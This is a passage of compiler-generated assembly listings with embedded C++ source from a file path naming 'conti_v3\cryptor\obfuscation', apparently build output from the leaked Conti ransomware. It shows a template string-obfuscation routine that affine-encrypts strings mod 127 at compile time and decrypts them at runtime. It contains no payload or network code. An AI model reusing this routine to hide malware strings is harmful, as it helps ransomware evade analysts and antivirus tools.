??0?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 15 00 00 00	 mov	 eax, 21
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 37	 mov	 BYTE PTR [rcx+1], 55	; 00000037H
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 6a	 mov	 BYTE PTR [rcx+3], 106	; 0000006aH
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 75	 mov	 BYTE PTR [rcx+5], 117	; 00000075H
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 7c	 mov	 BYTE PTR [rcx+7], 124	; 0000007cH
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 15	 mov	 BYTE PTR [rcx+9], 21
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 28 00 00 00	 mov	 eax, 40			; 00000028H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 76	 mov	 BYTE PTR [rcx+1], 118	; 00000076H
  00007	c6 41 02 28	 mov	 BYTE PTR [rcx+2], 40	; 00000028H
  0000b	c6 41 03 6c	 mov	 BYTE PTR [rcx+3], 108	; 0000006cH
  0000f	c6 41 04 28	 mov	 BYTE PTR [rcx+4], 40	; 00000028H
  00013	c6 41 05 42	 mov	 BYTE PTR [rcx+5], 66	; 00000042H
  00017	c6 41 06 28	 mov	 BYTE PTR [rcx+6], 40	; 00000028H
  0001b	c6 41 07 72	 mov	 BYTE PTR [rcx+7], 114	; 00000072H
  0001f	c6 41 08 28	 mov	 BYTE PTR [rcx+8], 40	; 00000028H
  00023	c6 41 09 28	 mov	 BYTE PTR [rcx+9], 40	; 00000028H
  00027	c6 41 0a 28	 mov	 BYTE PTR [rcx+10], 40	; 00000028H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 03 00 00 00	 mov	 eax, 3
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 0b	 mov	 BYTE PTR [rcx+1], 11
  00007	c6 41 02 03	 mov	 BYTE PTR [rcx+2], 3
  0000b	c6 41 03 17	 mov	 BYTE PTR [rcx+3], 23
  0000f	c6 41 04 03	 mov	 BYTE PTR [rcx+4], 3
  00013	c6 41 05 30	 mov	 BYTE PTR [rcx+5], 48	; 00000030H
  00017	c6 41 06 03	 mov	 BYTE PTR [rcx+6], 3
  0001b	c6 41 07 09	 mov	 BYTE PTR [rcx+7], 9
  0001f	c6 41 08 03	 mov	 BYTE PTR [rcx+8], 3
  00023	c6 41 09 03	 mov	 BYTE PTR [rcx+9], 3
  00027	c6 41 0a 03	 mov	 BYTE PTR [rcx+10], 3
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 78	 sub	 ecx, 120		; 00000078H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 12	 mov	 BYTE PTR [rcx+1], 18
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 77	 mov	 BYTE PTR [rcx+3], 119	; 00000077H
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 21	 mov	 BYTE PTR [rcx+5], 33	; 00000021H
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 03	 mov	 BYTE PTR [rcx+7], 3
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 78	 mov	 BYTE PTR [rcx+9], 120	; 00000078H
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 61	 sub	 ecx, 97			; 00000061H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
